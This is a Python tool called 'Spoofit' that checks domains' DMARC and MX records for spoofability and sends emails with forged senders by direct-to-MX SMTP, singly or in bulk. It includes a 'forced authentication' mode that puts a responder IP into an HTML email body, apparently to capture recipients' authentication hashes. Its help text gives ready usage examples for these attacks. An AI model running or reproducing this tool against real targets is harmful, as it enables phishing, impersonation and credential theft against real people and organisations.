#!/usr/bin/env python3
import smtplib
import dns.resolver
import argparse
import os
import configparser
import csv
import tldextract

def print_banner():
    banner = r"""
   _____                   _____ __ 
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_  
/____/ .___/\____/\____/_/ /_/\__/  
    /_/                             
   """
    print(banner)

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text().strip()

        # Resolve MX record to IPv4 only
        ipv4_addresses = []
        for rdata in dns.resolver.resolve(mx_record, 'A'):
            ipv4_addresses.append(rdata.to_text())

        if ipv4_addresses:
            return ipv4_addresses[0]  # Return the first IPv4 address found
        else:
            print(f"[!] No IPv4 address found for {mx_record}.")
            return None
    except Exception as e:
        print(f"[!] Error retrieving MX record for {domain}: {e}")
        return None
        
def send_email(mx_record, sender, recipient, subject, body):
    """
    Attempts direct-to-MX delivery of an email.
    """
    try:
        with smtplib.SMTP(mx_record, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Failed to send email to {recipient}: {msg}")
                return
            server.data(
                f"To: {recipient}\r\n"
                f"From: {sender}\r\n"
                f"Subject: {subject}\r\n"
                f"Content-Type: text/html\r\n\r\n{body}"
            )
            print(f"[+] Email sent to {recipient}")
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] Error sending email to {recipient}: {e}")

def load_config(forced=False):
    """
    Loads configuration from 'conf/spoofit.conf'.
    If forced=True, loads forced authentication subject/body.
    Otherwise loads standard spoof email subject/body.
    """
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None

    config.read(config_file)
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as file:
            body = file.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')
    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    """
    Inserts the responder IP into the forced auth email body template.
    """
    return body_template % {'responder': responder_ip}

def is_subdomain(domain):
    """
    Returns True if 'domain' is a subdomain (i.e. not the org domain).
    """
    extracted = tldextract.extract(domain)
    org_domain = f"{extracted.domain}.{extracted.suffix}"
    return domain.lower() != org_domain.lower()

def has_mx_record(domain):
    """
    Checks if a domain has any MX records.
    Returns True if MX records exist, False otherwise.
    """
    try:
        dns.resolver.resolve(domain, 'MX')
        return True
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
        return False
    except Exception:
        return False

def check_spoofability(domain):
    """
    Checks if 'domain' can be spoofed based on DMARC:
    - First checks if domain has MX records (no MX = not spoofable)
    - If p=reject => not spoofable
    - If p=quarantine => partial (Doubtful)
    - If p=none or no DMARC => likely spoofable
    - Subdomain logic: if org domain has sp=reject/quarantine => enforced
      else subdomain is unprotected
    """
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    result = {"domain": domain, "policy": "", "spoofable": False}

    try:
        # First, check if the domain has MX records
        if not has_mx_record(domain):
            print(f"{RED}[-] {domain} has no MX records (cannot receive email).{RESET}")
            result["policy"] = "No MX record"
            return result
        # Attempt to retrieve a DMARC record for the domain
        try:
            dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            dmarc_record = str(dmarc_answer[0]).lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            dmarc_record = None

        if dmarc_record:
            # We have a direct DMARC record for this domain
            if "p=reject" in dmarc_record:
                print(f"{RED}[-] Spoofing not possible for {domain}: DMARC p=reject (fully enforced).{RESET}")
                result["policy"] = "p=reject (fully enforced)"
            elif "p=quarantine" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=quarantine for {domain} (partial).{RESET}")
                result["policy"] = "p=quarantine (partial)"
                result["spoofable"] = True
            elif "p=none" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=none for {domain} (not enforced).{RESET}")
                result["policy"] = "p=none (not enforced)"
                result["spoofable"] = True
            else:
                print(f"{YELLOW}[!] DMARC record found for {domain} but unknown p= tag.{RESET}")
                result["policy"] = "No recognized p= (treat as none)"
                result["spoofable"] = True
        else:
            # No DMARC at the domain => check if subdomain
            extracted = tldextract.extract(domain)
            org_domain = f"{extracted.domain}.{extracted.suffix}"
            if org_domain.lower() == domain.lower():
                print(f"{YELLOW}[!] No DMARC for {domain}.{RESET}")
                result["policy"] = "No record"
                result["spoofable"] = True
            else:
                # Subdomain => check if org domain has sp=...
                try:
                    org_dmarc = dns.resolver.resolve(f"_dmarc.{org_domain}", "TXT")
                    org_record = str(org_dmarc[0]).lower()
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    org_record = None

                if org_record:
                    sp_tag = ""
                    for token in org_record.split():
                        if token.startswith("sp="):
                            sp_tag = token.split("=", 1)[1]
                            break

                    if sp_tag == "reject":
                        print(f"{RED}[-] {domain} has no DMARC, but {org_domain} has sp=reject => subdomain protected.{RESET}")
                        result["policy"] = "sp=reject (org domain)"
                    elif sp_tag == "quarantine":
                        print(f"{YELLOW}[!] {domain} no DMARC, {org_domain} sp=quarantine => partial subdomain.{RESET}")
                        result["policy"] = "sp=quarantine (org domain)"
                        result["spoofable"] = True
                    else:
                        if "p=reject" in org_record:
                            print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=reject but no sp= => subdomain not enforced.{RESET}")
                            result["policy"] = "No sp= (org p=reject)"
                            result["spoofable"] = True
                        elif "p=quarantine" in org_record:
                            print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=quarantine but no sp= => sub partial.{RESET}")
                            result["policy"] = "No sp= (sub partial)"
                            result["spoofable"] = True
                        else:
                            print(f"{YELLOW}[!] No DMARC for {domain}, no sp= => subdomain unprotected.{RESET}")
                            result["policy"] = "No sp= (sub unprotected)"
                            result["spoofable"] = True
                else:
                    print(f"{YELLOW}[!] No DMARC for {domain} and no DMARC for {org_domain}.{RESET}")
                    result["policy"] = "No record (org none)"
                    result["spoofable"] = True

        # After we've determined if it's spoofable, print the final "spoofing" line with nuance
        if result["spoofable"]:
            # If policy indicates 'quarantine', mention spam
            if "quarantine" in result["policy"].lower():
                print(f"{YELLOW}[+] Spoofing might slip through if spam is recovered.{RESET}")
            else:
                # If it's a subdomain => "maybe", else => "spoofing possible"
                if is_subdomain(domain):
                    print(f"{YELLOW}[!] Spoofing might be possible for subdomain: {domain}{RESET}")
                else:
                    print(f"{GREEN}[+] Spoofing possible for {domain}.{RESET}")
        else:
            # If we concluded not spoofable, we do not print a "spoofing possible" line
            pass

    except Exception as e:
        print(f"[!] Error checking spoofability for {domain}: {e}")
        result["policy"] = "Error"

    return result

def print_summary_table(dmarc_results):
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

    if not dmarc_results:
        print("[!] No domains to display in summary table.")
        return

    print("\nFinal Summary:")
    print("-" * 95)
    print(f"{'Domain':<35} | {'Notes':<35} | {'Spoofing Possible'}")
    print("-" * 95)

    for res in dmarc_results:
        domain = res["domain"]
        policy = res["policy"]
        notes = policy
        
        if res["spoofable"]:
            if "quarantine" in policy.lower():
                spoof_str = "Doubtful"
            else:
                if is_subdomain(domain):
                    spoof_str = f"{YELLOW}Maybe{RESET}"
                else:
                    spoof_str = f"{GREEN}Yes{RESET}"
        else:
            spoof_str = "No"

        print(f"{domain:<35} | {notes:<35} | {spoof_str}")
    print("-" * 95 + "\n")

def export_results_csv(dmarc_results, filename):
    if not dmarc_results:
        print(f"[!] No results to export to {filename}.")
        return
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Domain", "Has MX", "DMARC Policy", "Spoofing Possible"])
            for r in dmarc_results:
                domain = r["domain"]
                has_mx = "Yes" if r.get("has_mx", True) else "No"  # Default to True for backwards compatibility
                policy = r["policy"]
                
                if r["spoofable"]:
                    if "quarantine" in policy.lower():
                        spoof = "Doubtful"
                    else:
                        if is_subdomain(domain):
                            spoof = "Maybe"
                        else:
                            spoof = "Yes"
                else:
                    spoof = "No"
                writer.writerow([domain, has_mx, policy, spoof])
        print(f"[+] Exported results to {filename}")
    except Exception as e:
        print(f"[!] Error exporting to {filename}: {e}")

def load_domains_from_file(filepath):
    """Load domains from a text file, one domain per line."""
    domains = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                domain = line.strip()
                if domain and not domain.startswith('#'):
                    domains.append(domain)
        return domains
    except Exception as e:
        print(f"[!] Error reading domains from {filepath}: {e}")
        return []

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="DMARC-Focused Email Spoofing Tool.",
        epilog="""
Examples:

  1) Check single domain:
     Spoofit.py -t domain.com

  2) Check multiple domains from file:
     Spoofit.py -t domains.txt -o results.csv

  3) Send a spoofed email (single recipient):
     Spoofit.py -s sender@domain.com -r recipient@domain.com

  4) Send a spoofed email (multiple recipients from file):
     Spoofit.py -s sender@domain.com -r recipients.txt

  5) Forced authentication:
     Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder-ip
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument('-t', '--target', help='Target domain or file containing list of domains to check.')
    parser.add_argument('-o', '--output', help='Output CSV filename (optional, auto-generated if not specified).')
    parser.add_argument('-s', '--sender', help='Spoofed sender email.')
    parser.add_argument('-r', '--recipients', help='Recipient email or file containing list of recipient emails.')
    parser.add_argument('-f', '--forced', metavar='RESPONDER_IP',
                        help='Forced authentication with responder-ip.')

    args = parser.parse_args()
    if not any(vars(args).values()):
        parser.print_help()
        return

    # 1) Domain check logic (DMARC checks)
    if args.target:
        dmarc_results = []
        domains_to_check = []

        # Check if target is a file or a single domain
        if os.path.isfile(args.target):
            domains_to_check = load_domains_from_file(args.target)
            if not domains_to_check:
                print("[!] No valid domains found in file.")
                return
            print(f"[+] Loaded {len(domains_to_check)} domain(s) from {args.target}")
        else:
            domains_to_check = [args.target]

        print(f"\n[*] Running DMARC checks on {len(domains_to_check)} domain(s):\n")

        for dom in domains_to_check:
            res = check_spoofability(dom)
            dmarc_results.append(res)

        print_summary_table(dmarc_results)

        # Export to CSV
        if args.output:
            csv_filename = args.output
        else:
            # Auto-generate filename based on first domain or input file
            if os.path.isfile(args.target):
                base = os.path.splitext(os.path.basename(args.target))[0]
                csv_filename = f"{base}_spoofit_results.csv"
            else:
                csv_filename = args.target.replace('.', '_') + "_spoofit_results.csv"
        
        export_results_csv(dmarc_results, csv_filename)
        return

    # 2) Sending spoofed emails
    if args.recipients and args.sender:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients, 'r') as f:
                recipients = [line.strip() for line in f if line.strip()]
        else:
            recipients.append(args.recipients)

        if args.forced:
            cfg = load_config(forced=True)
            if not cfg:
                return
            subject, body_template = cfg
            body = create_forced_auth_email(body_template, args.forced)
            print(f"[*] Sending forced authentication email to {len(recipients)} recipients.")
        else:
            cfg = load_config()
            if not cfg:
                return
            subject, body = cfg
            print(f"[*] Sending spoofed email to {len(recipients)} recipients.")

        domain = get_domain_from_email(args.sender)
        mx_record = get_mx_record(domain)
        if not mx_record:
            print("[!] Failed to retrieve MX record. Exiting...")
            return

        for rcp in recipients:
            send_email(mx_record, args.sender, rcp, subject, body)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
